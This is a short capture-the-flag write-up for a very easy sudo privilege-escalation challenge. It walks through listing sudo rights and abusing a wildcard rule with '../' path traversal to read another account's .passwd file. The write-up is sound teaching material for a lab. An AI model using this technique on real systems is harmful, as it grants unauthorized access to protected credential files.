## sudo - weak configuration

| Author | Level | Points |
| ------ | ----- | ------ |
| notfound | Very Easy | 5 |


>Privilege escalation
>
> **Statement**
>
> Wishing to simplify the task by not modifying rights, the administrator has not thought about the side effects ...

#### Solution

First, read file `readme.md` by `cat` command. We see 2 line

```
You have to read the .passwd located in the following PATH :
/challenge/app-script/ch1/ch1cracked/
```

We know the filename we want to find is `.passwd`. Now use `sudo -l` to see what privillges on `app-script-ch1`. We see 2 line another

```
User app-script-ch1 may run the following commands on this host:
	(app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/ch1/*
```

Now we can get flag with

```
sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/ch1/../ch1cracked/.passwd
```